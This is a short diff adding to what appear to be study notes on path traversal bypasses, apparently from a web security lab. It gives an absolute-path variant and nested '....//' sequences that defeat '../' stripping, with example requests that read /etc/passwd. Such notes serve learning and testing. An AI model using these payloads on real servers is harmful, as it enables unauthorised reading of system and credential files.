@@ -6,3 +6,7 @@ If given var/www/html/images
 # 2. Traversal blocked with absolute path bypass
 If given var/www/images/?filename=a.jpg
 - ->Use absolute path var/www/images/?filename=/etc/passwd
+
+# 3. Traversal sequence stripped
+Use nested traversal, e.g."....//" when server block "../"
+-  ->e.g. GET /image/?filename=....//....//....//etc/passwd
